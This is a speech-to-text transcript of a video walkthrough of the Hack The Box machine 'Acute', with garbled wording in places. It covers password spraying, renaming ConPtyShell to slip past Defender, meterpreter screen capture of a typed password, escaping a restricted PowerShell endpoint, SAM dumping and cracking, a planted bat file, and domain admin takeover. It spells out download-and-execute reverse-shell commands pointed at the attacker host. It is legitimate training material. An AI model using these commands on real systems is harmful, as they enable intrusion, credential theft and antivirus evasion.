 what's going on youtube this is ipsec we're doing a cute from hack the box which has a lot of steps i can't remember everything i've covered in this video the box starts off with password spraying a powershell web access portal which lands you on a domain computer that's part of a domain and if you look at the processes you notice there's also interactive processes running from your same username which means there's probably a local logon so you can load up metasploit or any other c2 to migrate into that process take a screenshot and notice that users typing another user's password interactively so you can use that password to interact with the domain controller but powershell session configurations is in play which limits the powershell commands you can use so you have to escape that jail to get a part of that user do some other things to get access to a different user that can add users to a group that's part of domain admins which would allow you to read the root.text so with that being said let's just jump in as always start with the nmap so dash sc for default scripts sv enumerate versions oh a i'll put all formats bring the nmap directory and call it acute and then the ip address of 1010 11.145. this can take some time to run so i've already ran it looking at the results we have just one port open and that is 443 and it says it's microsoft http api httpd 2.0 and it is leaking the um ssl certificate name or at least the common name in the ssl certificate so we can put this in a host file so sudo v etsy host and we're going to add 1010 11.145 to point to this and i'm also going to add acute.local as well in case it uses that and one interesting thing to point is i bet if we ran nmap again it would change the banner away from this microsoft http api to the iis and i think it's going to do that because um the actual like host name a virtual hostname router isn't in the iis server it's in the http router for windows so when we don't give it the right hostname it's not reaching the iis so that's why we get that banner i'm running a second end map it can take a little while so we'll check it in a few seconds to see if it does point us to the um correct spot but i'm just going to go to https 10 10 11 145 and see what the page is i'm going to guess this is the default oh it's just a 404 not found so not even referencing iis at all but if we go to at server.acute.local accept this ssl warning we can get over to the page and it looks like it's just uh professional development training for healthcare professionals um we have some dead links this um about us looks like he's supposed to have an image we're probably supposed to have images here so i'm going to open up um this with f12 make sure i'm on the network tab and look for the 404s to see if we're missing any other sub domain and it's doing a get on at server.cute.local so this looks like it's just not there so if we make a request here it looks like it's just for a flooring is it just slash fonts nope um i was wondering if maybe it had an error and you need to specify the directory on this but that's not it if we do 10 10 45 like this and go to into the acute directory does this exist uh we've already specified https and no it does not so i'm not sure exactly where these files are supposed to be hosted but i don't think it's going to cause too much of an issue we can go to the about us page and something did change here we have this new starter form on the about us page if we click this we can save it and then i'm also going to just move it into this folder to stay a bit organized what is that file name new starter so we can move it here and then open this file and it looks like it is going to be a word document and we have it leaking a few things staff induction pages if we go here it is a 404 so maybe the sheet isn't kept up to date but it does have a checklist of things to do and it's not lorem ipsum so i'm assuming there's going to be some type of good information here if we look at it overview it's talking about the default password is set to password one we don't have a way to spray passwords yet so that's not really doing us much good i'm also looking for like who set this up things like that um running through new powershell wwa or pswa i'm guessing this powershell web access to highlight restriction with dc managed so it looks like they set some type of restrictions up and powershell web access or powershell accounts to limit commands that are ran make them in handy later complete remote training and we click here looks like it is loading something it is the acute staff access and that is it so going back we have windows powershell web access but we don't have a username we know we probably want to spray with password one exclamation point because that is what this document said right if we look at it it says the default password is that so probably what we want to spray with however we lack things we know the computer name is probably ats server so we could put this we just don't know username and password so what i generally do is run exif tool against what type of documents i find and see if we have anything so uh last modified by daniel so maybe the usernames are just the first name uh we have a different pc name acute pco1 and the creator is f castle um i'm gonna guess there's maybe a frank castle somewhere and this first initial last name so this is probably going to be the username convention and if we go back to the website and see if we have any other usernames if we do control f for castle we don't have anything however we do have a list of users here so a wallace c hall e davies so we can try these so let's go back um a wallace password one estimation point try to log in and failed so let's go back here we can try c hall i don't know why my window just did that i guess i clicked something i popped it out that's annoying uh e davies so if we do e davies password one exclamation point um they do that for c hall 2 it said authorization failure so if i do c hall password one exclamation point so it looks like that is a valid password for both c hall and e davies but um we're just not authorized to connect to the destination computer so let's try um going back here we can see acute pco1 acute pco1 c hall password one exclamation point can't access it e davies password one exclamation point it's thinking not the quickest server close these tabs out and i guess we can go back to that nmap because i don't think i did but if we less nmap acute dash hostname dot nmap it's still oh it has two server headers we have http api and iis slash 10. so adding the host name in our host file allowed it to um query this server via the hostname and get a different http header again if we just look at the acute nmap before we added ats server in our host file it only had one header of http api it's pretty cool that nmap actually shows multiple headers but meanwhile we have a powershell shell the first thing i would do is figure out exactly where i am i'm assuming i'm going to be on acute pco1 but still run hostname as well just to confirm that and then we can probably ping ats server the server name where iis is to try to get another host we see it's 172 16 22 1 which is a bit weird because when we access the box we're accessing over 10 10 11 145 so we know there's some type of network address translation going on here and we can see this box is actually 172 16 22.2 so um i'm going to try a dir and c colon backslash to see if there's like a docker m file and doesn't look like there is but there is this utils which is weird so let's go into utils and there's nothing there um i wonder if i do dir c colon utils star dot star is that going to show me hidden files no um let's see gci c colon utils um let's see get child item show hidden just to see if there's any hidden files uh let's see to display hidden files of folders use the force parameter dash force we see there is a desktop.ini i'm just gonna do a dir sql in backslash dash force to see if there's any um files and gci sql and backslash dash force let's see we have a dump stack dot log.temp i don't know what that is what is this file it's probably just some crash dump or something but maybe it relates to some virtualization technology and we find it um no idea hidden file root of c drive windows troubleshooting cell no idea what that file is but the utils had a desktop down i so let's take a look at it if we do cd backslash utils uh gci um desktop.ini or maybe we can do type desktop.ini and the info tip is directory for testing files without defender so this looks like it's a defender exclusion directory which is a bit weird we could have also found this information with win peas so if we went to github win peas and downloaded it i always like downloading it because the author updates this so often that i always want to have the latest signatures so we can see may 11th uh five days ago there's a new release so always always good to download the latest we can copy the link uh i'm just going to download any this is net so i don't know exactly what the purpose of an architecture on.net is but besides the fact download it let's make sure i have it every now and then when i download from github i accidentally um like download the html page instead of the file so that's why i always run file against anything i download um just making sure so we can run http server and then go back to the shell we can do a w get dot o or dash o win ps dot exe http 10 10 14 8 8 000 how is this casing win psne.exe i'm just going to copy and paste this paste okay we have it hit our web server so it has successfully downloaded it and i don't i guess we can try running it in here i'm curious what's going to happen just execute windpeas oh god that that is that is ugly cancel can i cancel that easily um because wind peas is doing a bunch of coloring stuff uh the outputs just got awful so let's get a reverse shell so e davies and then password one at pc acute pc01 uh e davies number of oh come on if i exit out of this is it going to kill the session and can i log on please say password1 estimation point i'm going to just pause the video wait a little bit and then try logging on again okay i had to actually reboot the box to get this working but um i'm sure it would have worked if i waited long enough or we just let the uh win peas finish but logging back in and once i'm in i'm going to use a new tool well new to me but um to get a reverse shell because it has um full like um pty so i think it's con pty shell let's try this github yep this thing and i'm just going to invoke it with this powershell script i cannot connect to the destination acute pcr one e davies maybe it wasn't up yet that's weird but we're going to download this and we can call this let's go into dub dub dub i'm going to call it rev.ps1 and then defender does flag this however if we delete the how to use this because defender a lot likes to make signatures upon that and then also we can rename con pty shell to be ipsec and then we want to look for a con pty shell and also just change that to ipsec as well and i think that's all we have to do to evade defender i think defender just has like flags for khan pty shell so once we move that it kind of works for us and do we have access yet acute pco1 e davies maybe i did not give this long enough let's see exif tool new document grep acute dash pc01 okay there we go now we're in so here's how we do this shell it's a bit weird we just run this command this stty raw so i'm going to do it on a new terminal because um if we look at the commands it does it does this stty why uh stty size and it gets the rows and columns if we put it in like panes it gets weird so i'm always best to dedicate a full thing to it i'm going to put on 9001 instead of 3001 just because and then all we do is iwxit and then invoke so let's go back here i'm going to do iex new object net.web client download string if i can type correctly http 1010 14 8 8000 rev.ps1 is what i called it and it's going to [Music] load this i believe if oh no we have it up here sweet i was like i don't have my web server started but no we have it 10 10 14 8 8 000 we got it i don't have any warnings about av and then the next thing it says to do is run invoke con pty shell the ip and the port and we rename this to ipsec so i'm just going to do um ipsec 1010 14 8 9001 before i hit enter i just want to go here hit it and look and we see a connection from and voila we have powershell so i can go cd backslash i think it's utils uh cd backslash util oh error writing history file so it's trying to write to the console history but um fails and it's trying to do this because we have a legitimate shell right um so now we can do wget oh 10 10 14 8 8 000 win psne.exe i want to say win ps.exe and i have my up arrow which is super nice um let's see i did dash error twice again i just have to re-download this because i did revert the box but now when we run win peas this looks much better the other thing i like about this con pty shell is we have tab auto complete everywhere such as in our powershell functions so um yeah it just becomes a very nice thing to have so i'm going to pause the video and let this finish okay win peas is done so i'm just going to go up to the top and let's see we should do win ps.exe here we go and we can start going through this there's a lot of information so i'm probably going to miss the things i wanted to point out but one of the things is windpeas does tell us the windows defender configuration and path exclusion so that's really good to know that um we can just query that it is a just registry setting so we can put files in sequel and utils the other thing is something when peas actually gets wrong but um it's still good to know it says there's a remote desktop connection when i think it's just a local log on so i'm trying to find out where that is let's see file path rule i'm just gonna search for console there we go so it says rdp sessions uh one console e davies acute and it says it is active so if we run let's say task list task list let's see give it time to run access tonight let's try get process i'm sure um win peace also shares processes probably but we can see the one means interactive here and we see the user has microsoft edge opened you can also look at explorer and see that's interactive so we know someone is logged into the system now at this point we want to get into this context because um we are here well i'm not sure this exact process right but we're at zero non-interactive so we can't interact with the desktop to get like a screenshot so to do that i'm just going to load up metasploit because that's the easiest way to do it so msf venom dash p x6 uh let's see i think it's windows x64 interpreter reverse tcp lhost 10 10 14 8 l port um we're using 9001 so we'll do 9002 uh dash f exe o we'll call it met.exe and i probably should have put that in www so we'll move it after it's created and then msfdb run i have to run as root wget o met.exe http 1010 14 8 8 000 met met.exe download it use exploit multi handler set payload windows x64 mutterpreter reverse tcp set l host ton zero set l port 9002 exploit dash j and we execute met.exe so here we have it's sending the stage it should say session opened so you can do sessions dash i1 and now we have an interpreter session so we can just do ps and we want to look for explorer um this one's probably us we have non-interactive edaviespowershow.exe but we want to get to explore so i'm just going to migrate into 3588 which is explorer's pid and once we're in here we should be able to take a screenshot so screenshot and it's saved so if we go to places home ipsec hdb acute and we can look at the screenshot it looks like it's in the middle of something i want to take a few more real quick just to see if we get something we may have lucked out here so let's look at the second screenshot we have a password right here and it looks like it was typing let's see do we have a username or something i think they were getting ready to put that in acute imocs so we have imonk's password another way to do this we could invoke a script to get a vnc session but there's also this screen share which creates an html file that if you open this it creates a video so um every like 5-10 seconds it will automatically refresh and show something there so we got lucky and just got it manually but we saw this refreshing that's it just getting a new screenshot and this player will automatically update right so here we go we see command prompt open now a run prompt running powershell and we'll see the same exact commands that we had just saw so let's go and take what they did and put it in a note right because the downside with screenshots is we can't just copy and paste so let's see and i broke my thing i was like oh let's not do panes on this um reverse shell and then i did a pain but oh well we can do v notes dot text and start typing that password w3 let's see i can do that that there we go for r3 th3 fo rce period and that is acute backslash i monks so the first thing i do is try logging in this way right this way not the um i want to save that one not the screenshot but this so acute i monks password we are the force and we can say acute-pcr-1 and it's saying the password is wrong and even if we had the server wrong last time it would tell us the password was right so that is weird um what is he doing though so it looks like let's see configure do we have it here see nope let's just close some of these windows we want to get the actual full command he is running because if you remember back when we did the um word document it said they were using some type of um i forget what it said do we have it open yeah so it's uh some restrictions through dc manage so i'm not gonna wait um i'm just gonna run through the commands and if you're doing this you could just wait and see them type this right but um there's no fun in waiting also i'm going to type these things in a note file mainly because it's just a pain to type this constantly if i like lost my shell and wanted to redo it so i'm just going to v run me dot text i couldn't think of a more creative name but we need to create a pass convert to secure string this password as plain text with the force and then we create the credential object so new object system management automation ps credential acute backslash i monks and then the pass so cat run me and we could probably do this through like metasploit or something and use their tools a bit easier but i like avoiding it when i can just because it's nice to see the manual way right so we see username and password here and now if i did something like enter ps session at server credential cred we'll see we failed but if i did dash configuration name dc manage and this is in the um notes that like note document as well as if you um view the whole output of them typing you'd get this and we see oh i thought it actually is it ats do i need another s let's see username and password incorrect i bet i typered the password see is it a capital w acute eye monks i want to say that's right so this one is can't find this is failing all over the place so um that is a kerberos error can't find the computer ats server so i think it's two s's let's see i have something open here see this ats server so two s's yeah this is the error message as i was expecting so let's fix our thing it's a capital w in this password so v run me capital w there but the measure object is not recognized so when we first nrps session i guess it uses measure object to get some information and it's not a function so we can't really use it so what we do is invoke command computer name at s server and then let's see dash credential and that's why i really like the con pty thing because i have tab autocomplete here so if i just do dash comp hit tab and it fills that out dc manage and then dash script block and we run git command this will list all the commands available to us as long as we typed it correctly and it may take a second and we have a handful of commands get alias get child item get command set content so we can write files um if we ran git alias it's going to show what these commands are alias to um gci this is like how we got the directories um get commands command we ran get content this is going to get the contents of a file um get location i think this is like pwd yep so here we have the aliases cat cd echo ls pwd sc and type so those are all the commands we can use so if i do a pwd we should be able to see the files right so just running this it takes its sweet time we are in imonk documents so if i do ls here we should see what's in the documents and then we probably want to go over to the desktop because the desktop's generally where the user flag is so just give it a second nothing here um let's see i wonder if we can do gci dash force if it lets us use that this will show hidden files um it was beneficial once before in the util directory so figured um we may want to try it again uh we can't use abbreviations that's annoying child item is it items or item let's see item it's running and is it going to come back with anything um it just shows links so nothing interesting but that force did do something so probably should always get in the habit of just using it let's go up one directory and go into the desktop and see if there's anything in the desktop and it's still going to take its wheat time i wonder if i did this without this con p2i for it still take a long time if this is my shell or just the powershell in general i'm guessing it's the powershell in general but we have a user.txt and wm.ps1 i'm going to see if i can execute this so if we do c colon users imoncs desktop wm.ps1 does it let us execute this and if it does can we just execute like any command on the server or is it specifically like these files i don't think we can create a file in this box we have set content but i don't think that allows us to create a new file but we could replace stuff in this file so that will be handy and it looks like we can execute this i'm going to run who am i real quick and just see if that runs or we get a error but this is running against our box or against acute pc-01 we don't know who it's running at so we should cat this file um it did run that so we can run files i guess on this box so if we have a way to drop a file we can execute it um but we can just set content on this wm but first let's just see if there's a password hard coded so cat i tried period period uh-oh my shell is going slow slash dying there we go looks like it's back wow this is going slow um maybe this is the downside of doing this one weird shell maybe it would be faster if i just use rlwrap because if i used rlwrap um it's not sending anything really to the server until i hit enter so it would be really fast that way with this com pty shell every keystroke i send gets sent to the server that's why tab auto complete and stuff works so we have it setting a secure password and this is on the um remote box so the secure password does use information from the local host to encrypt the string so i can't just decrypt this on my local box um and it's using this jmorgan account on acute pco1 so if i do um let's see netuserjmorgan domain see what happens rpc server is unavailable i wonder if we can do let's see through this net user j morgan can we run it here we can so he is a domain user so it's another user on this we could try running just net user or let's do net local group administrators and we see j morgan is a local administrator of this box so the commands i ran um i did this invert command well first um locally i tried to check if j morgan is a member of the domain so i can see what groups he is i ran this and i couldn't talk to the domain controller from this box so the next thing i did is i ran it again from the domain controller the reason why i don't have a slash domain here is because domain controllers don't have a concept of local users they're just the domain controller right so i saw that i saw here's just a regular account so then i used net local group administrators and saw j morgan was a local admin to this box but back to [Music] the search and replace thing so we want to replace this git volume with something malicious because it's doing the password for us and then um runs this command right so we just want to replace this with um anything we want so i'm going to do a script block and we're going to do the iex and see if we can get a reverse shell that way so let's type it out in a notepad because it's going to get complex so first we have to download the desktop to us because we can't just create a whole new file we have to copy the secure password piece too right so i'm going to cat the file wm.ps1 and then what we're going to do is wrap this and replace i'm going to replace get volume with our iex object so ixnew object net.web client download string http 10 1010 14 8 8001 rev.ps1 like that and i hope this is going to work i'm going to put this in double quotes and let's see after this i do that end to end this parenthesis and then we can set content path desktop wm.ps1 so hopefully this works and the one thing we will have to do so v um www.rev.ps1 i'm going to do epsec and then it's ip and port so 9001 again and let's see sdty we can copy this so we'll see if this works i have not actually tried it with this shell before so it will be interesting um let me copy this again and probably have some type of error but we will fix that as it comes and this highlighting does work well we see at least we didn't mess up the quotes because the green's where we want it to be um let's see uh we have to put this in the um invoke thing i just ran that locally so in this invert command this is where we run it still looks good so after this we can cap the file we probably should have catered it after we ran the command but live and learn i guess we can copy this so we can do it quickly to see what it looks like oh come on let's see you should have a cat somewhere here we have it if we cat it we can see we have replaced hopefully that's not putting a new line um it's very possible it did i guess let's execute it and see what happens i don't know why it would do a new line because that's not where this is we don't have anything yet is it going to work let's see can't bind argument so it did not like that so script block huh well that sucks um i'm going to try something real quick let's just copy this and we can say echo that did put it on a separate line weird to rev.ps1 so now we should be able to just execute this file instead of that long string i guess when i pasted it it did that well that sucks let's see this just got a bit harder because now we have to fix this so we can replace that right we do a comma and we'll paste this again and get rid of that line break and watch as i do this there's going to be something that happens on the server that fixes the file there we go so maybe that fixes it hit enter a few times because this command doesn't give output so it's very possible that it runs and you just don't think it ran so we cat it let's see what it looks like it still looks bad we're not dead in the waters yet because we can replace download so if i replace download here it should start here and we just replace the string that way okay so it's going to error right here but we don't really care about that error as long as it runs first hopefully we get a shell here if not then we may be waiting like five ten minutes and hoping this file reverts and we can try again with um just a regular file i'm guessing it's not gonna oh there we go we have a shell awesome so if i do who am i here we are now j morgan who is um an admin on the system so we should be able to go into config and let's see copy sam to c colon sam do we have access um we can't because the file is being accessed i guess when the tty got set it got set at this size so when we make it bigger weird things happen so um let's just stay in a small console i'm sure there's a command if we went to the github page to resize it manually but um i don't want to worry about that we do regsave hklm [Music] sam to sam does that work uh let's see reg save is that's not it i think there could be a space and there we go and the other hive we want to back up is the system and no we don't want to overwrite we forgot to rename it and we could have just went into meterpreter and did it that way um [Music] since this session died i'm going to do it this way too because we could just run hash dump right and get what we want but i want to show it without interpreter in case you're not using that so let's do utils met.exe we'll get the shell sessions oh just let it get it come on you should have it session.2 help yeah it's loaded um if i just do hash dump i believe uh load priv hash dump um shell interpreter is working right who am i we're jaymorgan hashtag should work let's see bg search smart hash let's use this module set session one set and get system true i wonder if that's what we had to do such as i2 hold on get system let this wait come on hashtag well we got administrators hash but that's it that's weird let's just run this module the smart hash dump set session two and we can see it's extracting the keys this is what we're doing with the sam and system is extracting it and my metasploit is weird it shouldn't do this error but um maybe your results will change if you do it this way but let's just download this file so sessions i2 um cd c colon dir we can download cd backslash dir download sam and download system these are the registry highs i want to say sam is the user hive and system is the local system i may be wrong about that but we have those which then enables us to use secret stump so this is an impacted tool secret stump and then let's see i think we just do system system sam sam local and it's going to let's see unrecognized arguments we do local and caps these are lowercase there we go and we have this so we have a few hashes we have natasha we have administrator um generally i always like using password history i think it's pwd history i know i've said this before in a video um pwd last set no that's just gonna tell us when the password was set right that didn't tell us anything extra i guess maybe in the sam the local file it's not going to save that i do dash history yeah if this was a dump from a domain controller these flags would tell when the password was last set and history would also give you old passwords but i'm guessing may not be doing that here but with these we can now attempt to crack so let's go over to the kraken where i have hashcat installed v hashes or go into hashes v acute.txt and i just want to do username colon hash so that's all we do so we do i'm going to hit q a to start recording a macro delete this and then search for a colon delete that hit q and now as long as i go right here oh shoot i think i just screwed everything up i got too fancy i screwed up the vim macro let's just do it manually uh guest default we don't need those don't need that we just need these two there we go and then we run hash cat and then hashes acute word list is going to be opt word list rocky.text and we'll see if either these hashes crack but we also have to do users or dash dash user and we have to do user because i did username colon the hash and this one since it conflicts with so many things we'd specify it is an ntlm hash it can't just auto resolve this so it's running against rocky.text should only take a second how much longer is it going to take where is performance progress 68 um it's only attempting to crack one it should be attempting to crack two let's see i screwed something up here so administrator i have two colons here and what i want to do what is that flag it keeps telling me to set um dash capital o w3 there we go and this time we should have two potential cracks right attempting to okay so we'll let this sit hopefully um it recovers it quickly and we have one password cracked password at one two three so let's see if we go back to here oh this is a screenshot let's just close both of those screenshots go to one of our shells this one is dead because we're executing this guy so if we do um a net user slash domain or pc server unavailable so let's see i wonder if we can this is annoying let's see you don't need a crack anymore cat is it run me it is so we can save this paste this and then what else did we do net user we can grab this copy and of course it has a bunch of line breaks that's the annoying most annoying thing sometimes when copying there we go cat test copy paste so now we have a list of users we have a wallace c hall so we know c hall's password was password one um e davies we know i monks we got j morgan so it's either l hopkins or a wallace if it's password reuse so that's easy enough let's just copy this paste a wallis we should have saved this password let's see grab it paste ats server um let's see not authorized so if we do um let's see acute pc-01 authorization failure so at least we know this is a wallace's um it's possible she's just not a member of um the remote use whatever group to do powershell web access so let's copy this then create one for a wallace so here acute slash a wallace you can copy this paste it here and i'm going to see if we can fix this real quick method one method two let's see server side client side see this does he run a command afterwards non-interactive let's see ah here we go um change console size so if i open this st2y size 26 105. so if we go here we set width to 105. 105 and then height 26. i wonder if there's a reverse these may be reversed height is equal to was it 25 26 it just seems so small let's set it and then do this and that looks better sweet so now if i ran the net user command do we still have access we do and now we are a wallace on this right we are so all of that for me about to just um run this again to see if we get her shell as her so copy this 9001 do it in a new pane that way it gets set properly the first time ix new object netweb client download string http 1010 14 8 8 000 rev.ps1 that looks good it should connect to us hopefully as long as our web server is still up still thinking about it web server is definitely still up uh what time is it 6 32 i wonder if that's yeah we still have some time i guess oh new object so i'm guessing we still have the same issue where we um oh i specified configuration name i wonder if a wallace doesn't need this get rid of that so even if i don't need it and i still put it then that configuration gets applied to me and access denied without it so it doesn't look like i can do that so at this point it's a lot of just manual enumeration so if we do gci c colon slash i think dash recurse will also recurse everything and let's see what this does it's probably gonna give us way too many files um [Music] let's not do recurse let's just do gci or ls c colon program files let's see sequel and backslash program files i think i did the quotes there because program files has a space and we can see hyper-v so the first thing i go for is like hyper-v because if we have privilege if this is running hyper-v and we have privileged the disk we maybe will just download the disk and as i'm saying it we already had admin on the box and we dumped the sam we can't download the disk of this server so that wouldn't be beneficial if we knew multiple vms were running i'd probably look for the vhdk files that house that type of information but there was one other thing that caught my eye and there's keep me on and that's not a default thing right so we should take a look at what keep neon is so if we do this it is a bat file so let's cat it so keep me on dot bat let's do a cat and i didn't show it but if we try to access this as any other user we wouldn't be able to do it and we see this is run every five minutes from lois and it's executing any type of bat file in this directory so all we have to do is drop a bat file in the directory and then we can execute it so let's use set content so if we do set content dash path c colon backslash program files keep me on ipsec.bat and then we create a value and let's do ix new object net.web client download string http 10 10 14 8 8 000 rev.ps1 like that let's see we closed that oh we already did i think that should be good we are listening i'm just going to reset i'm going to make sure we're listening there we go so let's do it ls again here we have ipsec.bat and if we cut it it looks like it should work so we'll see if we get a reverse shell when this hits it says it happens every five minutes so i'm gonna sleep for 300 seconds and if we don't get a hit then we're going to have to um do some other enumeration during that five minutes i realized i did something silly um if we go back to this shell and look at this it's running bat files which is not powershell right so chances are this ipsec.bat script needs to call powershell before iex so let's see do we have the replace here let's see do i have it in here if i do shell i do so i'm going to v shell so we can edit this real quick and we want to cat let's see what file is it or we can just create a new file let's just do that let's see this i'm going to call this ipsec we'll call it a.bat i'm going to do powershell and i think if i do double quotes and escape this that would work so now if we cat a.bat we have that and fight execute a dot bat let's see what happens we don't have to wait the four minutes right um shoot we do need put this in quotes let's see cmd c like this maybe so the issue i'm having is a funny one because in order to execute it i don't want to put quotes around it however the space is breaking it i think i can fix this by doing progress wiggly one progress quickly too nope that doesn't work um i guess we can just wait the five minutes and see what happens where is the ls set content here's cat see what a.bat looks like powershell i think that's fine the only thing i'm gonna pause about is escaping the quotes but i think i have to because we already use quotes once so there we go i do who am i we are now l hopkins so that was it that did work um and my terminal is fixed sweet so if we do who am i slash all see what members am i a part of group name let's see everyone built-in users pre windows dcom access nt authority batch console login authenticated users this organization let's see is it net groups hell hopkins still just a main user but the main difference is i am now on ats server and i think this is the domain controller right um let's see let's scroll up and do we have 88 yep so this looks like it is definitely a domain controller so maybe bloodhound will work um oddly enough i don't see ldap actually um hold that port real quick 389. six nope it's a well tcp yeah it should be open yep it is 389 right there okay so i'm gonna run bloodhound actually so let's do bloodhound github and like i've said before whenever running bloodhound i like just downloading the latest one because um like everything they change so often it just makes it easier so wget then we can unzip go into it sudo or let's do tmux or tmux uh sudo service neo4j i'll just run pseudo neo4j console that's what i want then we can run bloodhound and let's delete all our data so database clear okay and now we have to download um an ingester so let's do github show pound and go to releases download the showpound.zip and let's hope that um defender doesn't flag this because that's going to be what makes this the pain let's see sharpound this move in dub dub dub okay so let's go cd backslash program data w get dash o shotpound.exe 10 10 14 8 8 000 sharp pound dot exe we're downloading it and executing and it looks like it's working so i'm just going to [Music] let this run and then we're going to see what happens at the end bloodhound has now finished so [Music] let's copy it off and the way i'm going to copy it is i'm going to set up a smb server so impact smb server and i forget how to do this um see h share name call it share share path let's do it in www and packet smb server share pwd dash username is going to be this user so it is oh we don't know this user's name um shoot i wonder if we'll be able to do it anonymous i don't think we can normally anonymous share writing is disabled but let's see um dir copy this to 10 10 14 8 share bh.zip so you can't connect because it's not secure yep oh wait smb2 support we can add that smb to support run this copy again i said xcopy invalid drive see smb2 support yeah this is the annoying thing see username ipsec password ipsec try this and let's see netuse 10 10 14 8 share ipsec ipsec will this work net use see slash user network path was not found see how big is this uh i wonder if we can just base64 um powershell base64 file path this is going to be this then hey this is going to work well so um getting files off when you just have reverse shells sometimes is tough but the hacky solutions are the best solutions so i can call this bh.zip.b64 paste this and i wonder if we need to put this on one line which will suck um let's see we can cut this base64 d if we less it that's a zip so bh.zip here's a zip archive um we just want to drag and drop it on this it's looking good so hopefully we go through all this trouble and bloodhound helps us so analysis let's see where we can do database um let's see find all domain admins administrator and site admin if we look at site admin let's see unrolled members 3 site admins domain admins administrators not that so let's see search for node um l hopkins we can mark her as owned and shortest path from own principles so l hopkins has generic all over site admin and domain admins is this so from here we should be able to abuse it so if i right click generic all do help abuse info talks about and how to do it um we already have this password so all we have to do is run add domain group member and then add a user so let's see dash identity so let's try this i wonder if this is a power view command or a regular command so do this against site underscore admin site admin and let's see what else did i need dash members members and we'll do one of the members that's easy we can uh what was the first one we got um first user was he something let's see e davies and the reason i'm doing him so i can just log in with powershell web console on a machine quickly so run this does it say underscore admirer admins not sure it's taking its time see had domain group members not recognized so i wonder if i can do net local group site admin e davies slash add local group doesn't exist let's see site underscore admin slash domain slash ad maybe it's not local group i was doing logo group because it's domain controller but maybe we just do net group there we go so we have added e davies so now if i go here and we do e davies password one exclamation point sign in let's see acute dash pc one password one exclamation point we're here who am i slash all submit we have all these privileges so we should be able to just do dir ats server c um because it doesn't exist what let's see what is its ip ipconfig dir 172 1622.1 that is weird um invert command computer let's make this bigger for you name ats server script block who am i ats server failed see oh um we're a member of site admin yeah which is a member of domain admins so e davies let's see net group um slash domain oh this server can't really talk to the domain controller right let's see i wonder if we should just do a reverse shell to get this i'm gonna go back here let's go to a shell where is it here it is let's do net group site admin e davies is indeed a member of it so we can now just get another shell i guess v newts v run me i'm just going to add imong to it so it's imonx okay and then we will run this command again and get a shell as him okay and we need to invert command dash credential like this um we can leave the computer name that's fine script block ix new object net web client download string http 1010 14 8 8 000 rev.ps1 okay i'm gonna rename this to be forget whose session this is uh this box has gone all crazy with reverse shells 9001 okay we run this and we didn't get anything looking like this required privilege by the client so that is odd we executed again still saying required privilege who am i where l hopkins c site admin they're a member of it let's see i x so if i just do who am i i monks so i wonder if we can just do net user ipsec add and let's do a password like that command completed successfully and let's add ipsec to um domain admins okay so that seems to have worked now i'm just curious why we're going to get our shell so here let's do ipsec go this is that and ipsack okay copy paste this run who am i access is denied that is bizarre let's see i should have put these in different cadential objects so i could switch between i monk and ipsec quickly if we do net group domain admins access is denied let's do net group domain admins ipsec is not there so i wonder if something reverted everything right when i was doing this um site admin yep no one's a member of site admin so let's try this again net group site admin i monks slash add okay and let's add ipsec then we're going to set the password and this time when i create my credential object i'm going to call it cred2 i wonder if i didn't change the username cred2 okay so when i do who am i we can specify cred two and we're ipsec okay so ix new object net.web client download string http 10 10 14 8 8 000 rev.ps1 run that see i think it's five required privilege is still it's weird who am i slash all so at this point ipsec is domain administrator so um users administrator desktop see c colon you can do dir c colon backslash users administrator desktop and we should be able to get root.text i'm sure if i played around with it more um i'd get the reverse shell but at this point i know ipsec is a domain admin so hope you guys enjoyed that take care and i will see you all next week